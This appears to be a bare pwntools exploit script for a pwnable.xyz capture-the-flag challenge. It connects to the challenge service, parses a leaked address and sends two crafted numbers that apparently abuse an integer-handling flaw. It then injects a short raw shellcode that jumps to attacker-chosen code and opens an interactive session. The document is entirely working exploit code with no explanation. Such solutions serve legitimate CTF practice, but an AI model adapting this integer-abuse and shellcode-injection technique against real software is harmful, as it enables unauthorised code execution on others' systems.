from pwn import *


debug = 0
if not debug:
    sh = remote('svc.pwnable.xyz', 30028)
else:
    sh = process('./challenge')

sh.recvuntil('== ')
pan = int(sh.recvuntil('\n')[:-1], 16)
print "pan = ", pan
num = 0x80000000
num2 = pan - num



x1 = str(num) + " " + str(num2)
sh.sendlineafter('> ', x1)
shellcode = "\x00\x04\x24\x58\x48\x2d\xce\x02\x00\x00\xff\xe0"
pause()
sh.sendafter(': ', shellcode)
pause()
sh.interactive()

